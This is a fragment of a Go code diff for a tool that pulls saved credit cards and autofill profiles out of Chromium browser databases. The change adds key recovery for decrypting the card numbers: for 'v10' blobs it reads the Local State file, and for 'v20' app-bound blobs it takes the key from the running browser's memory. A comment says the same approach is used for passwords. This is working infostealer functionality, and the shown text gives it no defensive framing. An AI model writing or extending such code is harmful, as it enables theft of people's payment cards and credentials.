@@ -32,7 +32,7 @@ func readWebData(b chromiumBrowser, profile string, aesKey *[]byte) ([]AutofillP
 	}
 
 	profiles := readAutofillProfiles(db, source)
-	cards := readCreditCards(db, b.name, source, aesKey)
+	cards := readCreditCards(db, b.name, b.userDataDir, source, aesKey)
 	return profiles, cards, nil
 }
 
@@ -135,20 +135,33 @@ func readAutofillProfiles(db *sqliteReader, source string) []AutofillProfile {
 // readCreditCards reads saved credit cards from Web Data.
 // credit_cards: guid(0) name_on_card(1) expiration_month(2) expiration_year(3)
 //               card_number_encrypted(4) ...
-func readCreditCards(db *sqliteReader, browserName, source string, aesKey *[]byte) []CreditCard {
+func readCreditCards(db *sqliteReader, browserName, userDataDir, source string, aesKey *[]byte) []CreditCard {
 	rows, err := db.ReadTable("credit_cards")
 	if err != nil {
 		return nil
 	}
 
-	// Fetch key lazily using first encrypted card blob as the oracle.
+	// Fetch key lazily — same v10/v20 strategy as passwords.
 	if *aesKey == nil {
 		for _, row := range rows {
 			if len(row) < 5 {
 				continue
 			}
 			blob, _ := row[4].([]byte)
-			if len(blob) >= 3 && (string(blob[:3]) == "v10" || string(blob[:3]) == "v20") {
+			if len(blob) < 3 {
+				continue
+			}
+			prefix := string(blob[:3])
+			if prefix == "v10" {
+				if k, err := getKeyFromLocalState(userDataDir); err == nil && tryDecryptKey(k, blob) {
+					*aesKey = k
+					break
+				}
+				if k, err := getKeyFromBrowserMemory(browserName, blob); err == nil {
+					*aesKey = k
+				}
+				break
+			} else if prefix == "v20" {
 				if k, err := getKeyFromBrowserMemory(browserName, blob); err == nil {
 					*aesKey = k
 				}
